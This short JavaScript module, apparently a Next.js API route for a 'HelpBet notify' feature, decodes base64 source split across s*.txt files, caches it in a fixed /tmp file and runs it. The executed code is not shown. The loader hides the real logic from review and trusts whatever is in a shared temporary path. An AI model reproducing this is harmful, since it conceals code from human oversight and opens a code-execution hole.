/** HelpBet notify loader — reassembles from s0..sN.txt (raw base64 of source). */
import { readFileSync, writeFileSync, existsSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const dir = dirname(fileURLToPath(import.meta.url));
const cache = join('/tmp', 'hb_notify_full.mjs');

function loadCode() {
  if (existsSync(cache)) {
    try { return readFileSync(cache, 'utf8'); } catch {}
  }
  let b64 = '';
  for (let i = 0; i < 64; i++) {
    const p = join(dir, `s${i}.txt`);
    if (!existsSync(p)) break;
    b64 += readFileSync(p, 'utf8').trim();
  }
  if (!b64) throw new Error('HelpBet notify s*.txt parts missing');
  const code = Buffer.from(b64, 'base64').toString('utf8');
  try { writeFileSync(cache, code); } catch {}
  return code;
}

const code = loadCode();
try { writeFileSync(cache, code); } catch {}
const mod = await import(pathToFileURL(cache).href + '?v=5');
export default mod.default;
export const config = mod.config || { api: { bodyParser: false } };
